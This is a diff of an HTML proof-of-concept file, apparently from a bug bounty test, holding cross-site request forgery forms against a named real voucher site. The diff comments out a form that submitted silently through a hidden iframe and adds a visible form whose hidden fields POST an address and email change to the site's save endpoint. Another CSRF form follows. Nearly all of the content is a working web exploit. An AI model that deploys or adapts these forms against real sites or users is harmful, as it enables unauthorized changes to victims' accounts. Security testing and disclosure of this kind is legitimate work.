@@ -10,7 +10,7 @@
 <iframe name="hiddenFrame" style="display:none;"></iframe>
 
 <!-- CSRF 1 -->
-<form id="form2"
+<!-- <form id="form2"
       action="https://vouchers.jungfrau.ch/en/address/save"
       method="POST"
       target="hiddenFrame">
@@ -30,7 +30,26 @@
   <input type="hidden" name="shipping" value="PrintAtHome" />
   <input type="hidden" name="newsletter" value="on" />
   <input type="hidden" name="accept_terms" value="on" />
-</form>
+</form> -->
+
+   <form id="form2" action="https://vouchers.jungfrau.ch/en/address/save" method="POST">
+      <input type="hidden" name="appellation" value="Mr" />
+      <input type="hidden" name="firstName" value="Test&#32;user" />
+      <input type="hidden" name="familyName" value="Test" />
+      <input type="hidden" name="company" value="Bug&#32;Bounty" />
+      <input type="hidden" name="department" value="nhg" />
+      <input type="hidden" name="street" value="eudehuh&#32;jsdi&#32;32" />
+      <input type="hidden" name="additionalInformation" value="bhvgf" />
+      <input type="hidden" name="zip" value="11005" />
+      <input type="hidden" name="place" value="hg" />
+      <input type="hidden" name="country" value="IN" />
+      <input type="hidden" name="email" value="jeet&#95;pal&#64;teambugbase&#46;com" />
+      <input type="hidden" name="payment" value="&#35;onlinepayments" />
+      <input type="hidden" name="shipping" value="PrintAtHome" />
+      <input type="hidden" name="newsletter" value="on" />
+      <input type="hidden" name="accept&#95;terms" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
 
 <!-- CSRF 2 -->
 <form id="form1"
